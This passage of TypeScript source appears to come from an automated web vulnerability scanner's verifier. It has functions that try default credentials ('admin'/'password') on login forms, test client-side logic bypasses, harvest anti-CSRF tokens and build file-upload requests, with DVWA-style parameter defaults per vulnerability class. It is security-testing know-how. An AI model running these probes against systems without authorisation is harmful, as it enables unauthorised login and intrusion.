  const passwordParam = params.password_param || "password";
  const username = params.valid_username || params.username || "admin";
  const validPassword = params.valid_password || params.password || "password";
  const invalidUsername = params.invalid_username || username;
  const invalidPassword = params.invalid_password || "node2-invalid-password";
  const successPattern = regexFrom(params.success_pattern || params.login_success_pattern || "welcome|logout|dashboard|password protected|success");
  const failurePattern = regexFrom(params.failure_pattern || "incorrect|invalid|failed|denied|wrong|try again");
  const baseFields = { ...(params.fields || {}) };
  const invalid = await requestLoginAttempt(url, method, baseFields, usernameParam, passwordParam, invalidUsername, invalidPassword, params, headers, proxyUrl);
  const valid = await requestLoginAttempt(url, method, baseFields, usernameParam, passwordParam, username, validPassword, params, headers, proxyUrl);
  const invalidHasSuccess = successPattern.test(invalid.body);
  const invalidFailed = failurePattern.test(invalid.body) || !invalidHasSuccess;
  const validSucceeded = successPattern.test(valid.body) && !invalidHasSuccess;
  const confirmed = invalidFailed && validSucceeded;
  return {
    confirmed,
    reason: confirmed
      ? "controlled invalid and known/default valid credential attempts produced a login success differential"
      : "credential attempts did not prove a valid weak/default credential",
    requests: [
      { method: invalid.method, url: invalid.url, status: invalid.status, marker: "invalid-credential" },
      { method: valid.method, url: valid.url, status: valid.status, marker: validSucceeded ? "valid-credential-success" : undefined },
    ],
    details: {
      username_param: usernameParam,
      password_param: passwordParam,
      username,
      invalid_username: invalidUsername,
      invalid_failed: invalidFailed,
      valid_succeeded: validSucceeded,
      success_pattern: params.success_pattern,
      failure_pattern: params.failure_pattern,
      invalid_length: invalid.body.length,
      valid_length: valid.body.length,
      valid_excerpt: valid.body.slice(0, 500),
      invalid_excerpt: invalid.body.slice(0, 500),
      probes: [probeDetails(invalid, "baseline"), probeDetails(valid, "attack")],
    },
  };
}

async function verifyJavascriptLogic(url: string, params: any, headers: Record<string, string>, proxyUrl?: string): Promise<VerifyResult> {
  const method = (params.method || "POST").toUpperCase();
  const param = params.param || params.token_param || "token";
  const expected = params.expected_value || params.payload;
  const successPattern = regexFrom(params.success_pattern || "success|accepted|correct|valid");
  const failurePattern = regexFrom(params.failure_pattern || "invalid|incorrect|failed|denied|wrong");
  const page = await sendProbe("GET", params.baseline_url ? resolveSiblingUrl(url, params.baseline_url) : url, headers, undefined, proxyUrl);
  const falseFields = { ...(params.fields || {}), [param]: params.false_payload || "node2-invalid-client-value" };
  const trueFields = { ...(params.fields || {}) };
  if (expected) trueFields[param] = String(expected);
  const baseline = await requestWithFields(url, method, falseFields, headers, proxyUrl);
  const attack = await requestWithFields(url, method, trueFields, headers, proxyUrl);
  const confirmed = successPattern.test(attack.body) && (failurePattern.test(baseline.body) || meaningfulDifference(baseline.body, attack.body));
  return {
    confirmed,
    reason: confirmed
      ? "server accepted a client-derived or client-side-only value that failed under a controlled invalid value"
      : "client-side logic bypass or derived value was not proven",
    requests: [
      { method: page.method, url: page.url, status: page.status, marker: "baseline" },
      { method: baseline.method, url: baseline.url, status: baseline.status, marker: "invalid-client-value" },
      { method: attack.method, url: attack.url, status: attack.status, marker: confirmed ? "accepted-client-derived-value" : undefined },
    ],
    details: {
      param,
      expected_value_supplied: Boolean(expected),
      success_pattern: params.success_pattern,
      failure_pattern: params.failure_pattern,
      page_contains_script: /<script\b|\.js\b|function\s+\w+\s*\(/i.test(page.body),
      invalid_length: baseline.body.length,
      attack_length: attack.body.length,
      attack_excerpt: attack.body.slice(0, 500),
      probes: [probeDetails(page, "baseline"), probeDetails(baseline, "false"), probeDetails(attack, "attack")],
    },
  };
}

async function requestWithParam(url: string, method: string, param: string, payload: string, headers: Record<string, string>, proxyUrl?: string): Promise<HttpProbe> {
  if (method.toUpperCase() === "POST") {
    const fields: Record<string, string> = { [param]: payload, Submit: "Submit" };
    await injectAntiCsrfTokens(url, fields, headers, proxyUrl);
    const body = new URLSearchParams(fields).toString();
    const requestHeaders = { "content-type": "application/x-www-form-urlencoded", ...headers };
    const response = await sendHttpTracked({ method: "POST", url, headers: requestHeaders, body, proxyUrl });
    return { method: "POST", url, status: response.status, headers: response.headers, body: response.body, requestHeaders, requestBody: body };
  }
  const target = new URL(url);
  target.searchParams.set(param, payload);
  if (!target.searchParams.has("Submit")) target.searchParams.set("Submit", "Submit");
  const response = await sendHttpTracked({ method: "GET", url: target.toString(), headers, proxyUrl });
  return { method: "GET", url: target.toString(), status: response.status, headers: response.headers, body: response.body, requestHeaders: headers };
}

/** Fetch the form page and merge anti-CSRF / user_token fields for high-security authenticated POSTs. */
async function injectAntiCsrfTokens(
  url: string,
  fields: Record<string, string>,
  headers: Record<string, string>,
  proxyUrl?: string,
): Promise<void> {
  if (fields.user_token || fields.csrf || fields.csrf_token || fields.token) return;
  try {
    const page = await sendHttpTracked({ method: "GET", url, headers, proxyUrl });
    const tokens = extractHtmlToken(page.body);
    for (const [key, value] of Object.entries(tokens)) {
      if (!fields[key]) fields[key] = value;
    }
  } catch {
    // Best-effort token harvest; probe continues without it.
  }
}

function result(confirmed: boolean, reason: string, response: { method: string; url: string; status: number; body: string }, marker?: string): VerifyResult {
  return {
    confirmed,
    reason,
    requests: [{ method: response.method, url: response.url, status: response.status, marker }],
    details: { response_length: response.body.length },
  };
}

async function sendProbe(method: string, url: string, headers: Record<string, string>, body?: string, proxyUrl?: string): Promise<HttpProbe> {
  const response = await sendHttpTracked({ method, url, headers, body, proxyUrl });
  return { method, url, status: response.status, headers: response.headers, body: response.body, requestHeaders: headers, requestBody: body };
}

async function requestWithFields(
  url: string,
  method: string,
  fields: Record<string, string>,
  headers: Record<string, string>,
  proxyUrl?: string,
  options: { injectAntiCsrf?: boolean } = {},
): Promise<HttpProbe> {
  if (method.toUpperCase() === "GET") {
    const target = new URL(url);
    for (const [key, value] of Object.entries(fields)) target.searchParams.set(key, value);
    const response = await sendHttpTracked({ method: "GET", url: target.toString(), headers, proxyUrl });
    return { method: "GET", url: target.toString(), status: response.status, headers: response.headers, body: response.body, requestHeaders: headers };
  }
  const nextFields = { ...fields };
  // Default true for normal authenticated POSTs; CSRF attacks pass injectAntiCsrf=false so omit/stale paths stay intentional.
  if (options.injectAntiCsrf !== false) {
    await injectAntiCsrfTokens(url, nextFields, headers, proxyUrl);
  }
  const body = new URLSearchParams(nextFields).toString();
  const requestHeaders = { "content-type": "application/x-www-form-urlencoded", ...headers };
  const response = await sendHttpTracked({ method: "POST", url, headers: requestHeaders, body, proxyUrl });
  return { method: "POST", url, status: response.status, headers: response.headers, body: response.body, requestHeaders, requestBody: body };
}

async function requestLoginAttempt(
  url: string,
  method: string,
  fields: Record<string, string>,
  usernameParam: string,
  passwordParam: string,
  username: string,
  password: string,
  params: any,
  headers: Record<string, string>,
  proxyUrl?: string,
): Promise<HttpProbe> {
  const attemptFields = { ...fields, [usernameParam]: username, [passwordParam]: password };
  const tokenParam = params.token_param;
  if (tokenParam) {
    const tokenPage = await sendProbe("GET", params.token_url ? resolveSiblingUrl(url, params.token_url) : url, headers, undefined, proxyUrl);
    const token = extractToken(tokenPage.body, tokenParam);
    if (token) attemptFields[tokenParam] = token;
  }
  return requestWithFields(url, method, attemptFields, headers, proxyUrl);
}

async function markVerified(runtime: ToolRuntime, rawUrl: string, param: string, vulnClass: string, result: VerifyResult, evidenceId: string): Promise<void> {
  const endpoint = new URL(rawUrl).pathname;
  await runtime.coverage.mark({
    endpoint,
    param,
    vulnClass,
    status: result.confirmed ? "failed" : "passed",
    notes: result.reason,
  });
  runtime.plan.upsert({
    node_id: `plan-test-${slug(`${endpoint}-${param}-${vulnClass}`)}`,
    title: `Verify ${vulnClass} on ${param}`,
    status: "done",
    kind: "test",
    level: "work_item",
    parent_id: "plan-objective-analysis-test-plan",
    method: "VERIFIER",
    endpoint,
    parameter: param,
    vuln_type: vulnClass,
    result: result.confirmed ? "confirmed" : "negative",
    notes: result.reason,
    evidence_ids: [evidenceId],
    priority: 230,
    source: "verifier",
  });
}

function defaultParam(vulnClass: string): string {
  if (vulnClass === "command-injection") return "ip";
  if (vulnClass === "file-inclusion" || vulnClass === "path-traversal") return "page";
  if (vulnClass === "sql-injection") return "id";
  if (vulnClass === "xss-reflected") return "name";
  if (vulnClass === "xss-stored") return "txtName,mtxMessage";
  if (vulnClass === "blind-sql-injection") return "id";
  if (vulnClass === "file-upload") return "uploaded";
  if (vulnClass === "weak-session-id") return "session";
  if (vulnClass === "csrf") return "csrf_token";
  if (vulnClass === "brute-force") return "username,password";
  if (vulnClass === "javascript-logic") return "token";
  if (vulnClass === "idor") return "id";
  if (vulnClass === "jwt-alg-none") return "authorization";
  if (vulnClass === "open-redirect") return "to";
  if (vulnClass === "mass-assignment") return "role";
  return "-";
}

function regexFrom(value: unknown): RegExp {
  if (!value || typeof value !== "string") return /$a/;
  return new RegExp(value, "i");
}

function optionalRegexFrom(value: unknown): RegExp | undefined {
  if (!value || typeof value !== "string") return undefined;
  return new RegExp(value, "i");
}

function firstTokenField(fields: Record<string, string>): string | undefined {
  return Object.keys(fields).find((key) => /csrf|token|nonce/i.test(key));
}

function submittedValueAppeared(before: string, after: string, fields: Record<string, string>): boolean {
  return Object.entries(fields).some(([key, value]) =>
    !/csrf|token|nonce/i.test(key) &&
    value.length > 0 &&
    !before.includes(value) &&
    after.includes(value)
  );
}

function extractToken(html: string, name: string): string | undefined {
  const escaped = name.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
  const patterns = [
    new RegExp(`name=["']${escaped}["'][^>]*value=["']([^"']+)["']`, "i"),
    new RegExp(`value=["']([^"']+)["'][^>]*name=["']${escaped}["']`, "i"),
  ];
  for (const pattern of patterns) {
    const match = pattern.exec(html);
    if (match?.[1]) return match[1];
  }
  return undefined;
}

function resolveSiblingUrl(base: string, value: string): string {
  return new URL(value, base).toString();
}

function uploadRetrievalCandidates(baseUrl: string, responseBody: string, filename: string, params: any): string[] {
  const raw = new Set<string>();
  if (typeof params.retrieve_url === "string") raw.add(params.retrieve_url);
  for (const item of Array.isArray(params.retrieve_candidates) ? params.retrieve_candidates : []) {
    if (typeof item === "string") raw.add(item);
  }
  const escapedFilename = filename.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
  const attr = /\b(?:href|src)=["']([^"']+)["']/gi;
  for (let match = attr.exec(responseBody); match; match = attr.exec(responseBody)) {
    if (match[1]?.includes(filename)) raw.add(match[1]);
  }
  const pathPattern = new RegExp(`(?:https?://[^\\s"'<>]+|(?:\\.\\./|\\./|/)?[^\\s"'<>]*${escapedFilename})`, "gi");
  for (let match = pathPattern.exec(responseBody); match; match = pathPattern.exec(responseBody)) {
    if (match[0]) raw.add(match[0]);
  }
  raw.add(filename);
  const out: string[] = [];
  for (const candidate of raw) {
    try {
      const resolved = new URL(candidate, baseUrl).toString();
      if (!out.includes(resolved)) out.push(resolved);
    } catch {
      // Ignore malformed server-provided paths.
    }
  }
  return out.slice(0, 8);
}

function meaningfulDifference(left: string, right: string): boolean {
  if (left === right) return false;
  const delta = Math.abs(left.length - right.length);
  return delta > 20 || /exists|missing|true|false|error/i.test(`${left}\n${right}`);
}

function excerptAround(value: string, marker: string): string {
  const index = value.indexOf(marker);
  if (index < 0) return value.slice(0, 500);
  const start = Math.max(0, index - 180);
  const end = Math.min(value.length, index + marker.length + 180);
  return value.slice(start, end).replace(/\s+/g, " ").trim();
}

function looksSequential(values: string[]): boolean {
  const numeric = values.map((value) => Number(value)).filter((value) => Number.isFinite(value));
  if (numeric.length >= 3) {
    const diffs = numeric.slice(1).map((value, index) => value - numeric[index]);
    if (new Set(diffs).size <= 2) return true;
  }
  return new Set(values).size <= Math.max(1, Math.floor(values.length / 2));
}

function multipartBody(boundary: string, fields: Record<string, string>, fileField: string, filename: string, fileContent: string): string {
  const chunks: string[] = [];
  for (const [key, value] of Object.entries(fields)) {
    chunks.push(`--${boundary}\r\nContent-Disposition: form-data; name="${key}"\r\n\r\n${value}\r\n`);
  }
  chunks.push(`--${boundary}\r\nContent-Disposition: form-data; name="${fileField}"; filename="${filename}"\r\nContent-Type: text/plain\r\n\r\n${fileContent}\r\n`);
  chunks.push(`--${boundary}--\r\n`);
  return chunks.join("");
}

function slug(value: string): string {
  return value.toLowerCase().replace(/[^a-z0-9]+/g, "-").replace(/(^-|-$)/g, "").slice(0, 100) || "item";
}

function persistVerifierTraffic(runtime: ToolRuntime, result: VerifyResult): string[] {
  const probes = Array.isArray(result.details?.probes) ? result.details.probes : [];
  const ids: string[] = [];
  for (const probe of probes) {
    if (!probe || typeof probe !== "object") continue;
    const row = probe as Record<string, unknown>;
    const method = typeof row.method === "string" ? row.method : "GET";
    const url = typeof row.url === "string" ? row.url : "";
    if (!url) continue;
    ids.push(runtime.traffic.add({
      source: `verifier.${String(row.role || "probe")}`,
      method,
      url,
      status: typeof row.status === "number" ? row.status : undefined,
      requestHeaders: recordOfString(row.requestHeaders),
      requestBody: typeof row.requestBody === "string" ? row.requestBody : undefined,
      responseHeaders: recordOfString(row.responseHeaders),
      responseBody: typeof row.responseBody === "string" ? row.responseBody : undefined,
    }));
  }
  return ids;
}

function probeDetails(probe: HttpProbe, role: string): Record<string, unknown> {
  return {
    role,
    method: probe.method,
    url: probe.url,
    status: probe.status,
    requestHeaders: probe.requestHeaders,
    requestBody: probe.requestBody,
    responseHeaders: probe.headers,
    responseBody: probe.body,
  };
}

function recordOfString(value: unknown): Record<string, string> {
  if (!value || typeof value !== "object" || Array.isArray(value)) return {};
  const out: Record<string, string> = {};
  for (const [key, item] of Object.entries(value)) out[key] = String(item);
  return out;
}
